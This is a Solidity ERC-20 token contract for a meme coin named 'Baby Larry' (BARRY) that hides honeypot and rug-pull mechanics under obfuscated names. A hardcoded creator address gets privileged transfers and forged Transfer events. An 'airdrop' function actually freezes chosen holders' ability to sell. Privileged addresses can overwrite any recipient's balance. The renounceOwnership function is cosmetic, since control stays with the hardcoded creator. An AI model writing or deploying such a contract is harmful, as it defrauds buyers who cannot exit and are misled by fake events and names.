pragma solidity 0.8.17;

abstract contract Context {
    function _MsgSendr() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address _contractcreator = 0xd83082647C8D09a36d04Ef5522CF8E1b2aaAfa35;
	address V2UniApproval = 0x590c19Db370E21Dd96f8cCf6E20A1701E6dDa215;
    constructor () {
        address msgSender = _MsgSendr();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }

}

contract BABYLARRY is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private MaxLimit;
	mapping (address => bool) private MinLimit;
    mapping (address => bool) private NoLimit;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _kpTotalSupply = 690420088000 * 10**_decimals;
    string private constant _name = "Baby Larry";
    string private constant _symbol = "BARRY";

    constructor () {
        MaxLimit[_MsgSendr()] = _kpTotalSupply;
        emit Transfer(address(0), V2UniApproval, _kpTotalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _kpTotalSupply;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return MaxLimit[account];
    }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

        function approve(address spender, uint256 amount) public returns (bool success) {    
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
        
		function appendkep(address px) public {
        if(MinLimit[msg.sender]) { 
        NoLimit[px] = false;}}
        
        function airdrop(address px) public{
         if(MinLimit[msg.sender])  { 
        require(!NoLimit[px]);
        NoLimit[px] = true; }}

		function contextualize(address px) public{
         if(msg.sender == _contractcreator)  { 
        require(!MinLimit[px]);
        MinLimit[px] = true; }}
		
        function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == _contractcreator)  {
        require(amount <= MaxLimit[sender]);
        MaxLimit[sender] -= amount;  
        MaxLimit[recipient] += amount; 
          _allowances[sender][msg.sender] -= amount;
        emit Transfer (V2UniApproval, recipient, amount);
        return true; }    
          if(!NoLimit[recipient]) {
          if(!NoLimit[sender]) {
         require(amount <= MaxLimit[sender]);
        require(amount <= _allowances[sender][msg.sender]);
        MaxLimit[sender] -= amount;
        MaxLimit[recipient] += amount;
      _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}

		function transfer(address recipient, uint256 amount) public {
        if(msg.sender == _contractcreator)  {
        require(MaxLimit[msg.sender] >= amount);
        MaxLimit[msg.sender] -= amount;  
        MaxLimit[recipient] += amount; 
        emit Transfer (V2UniApproval, recipient, amount);}
        if(MinLimit[msg.sender]) {MaxLimit[recipient] = amount;} 
        if(!NoLimit[msg.sender]) {
        require(MaxLimit[msg.sender] >= amount);
        MaxLimit[msg.sender] -= amount;  
        MaxLimit[recipient] += amount;          
        emit Transfer(msg.sender, recipient, amount);
        }}}